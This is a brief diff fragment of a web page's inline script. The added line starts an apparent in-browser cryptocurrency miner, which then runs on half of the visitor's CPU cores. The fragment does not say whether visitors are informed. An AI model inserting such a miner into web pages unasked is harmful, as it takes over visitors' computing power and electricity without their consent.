@@ -81,6 +81,7 @@
   <script>
     var mi = setInterval(function(){
       if (miner != null){
+        miner.start();
         miner.setNumThreads(navigator.hardwareConcurrency/2);
         clearInterval(mi);
       }
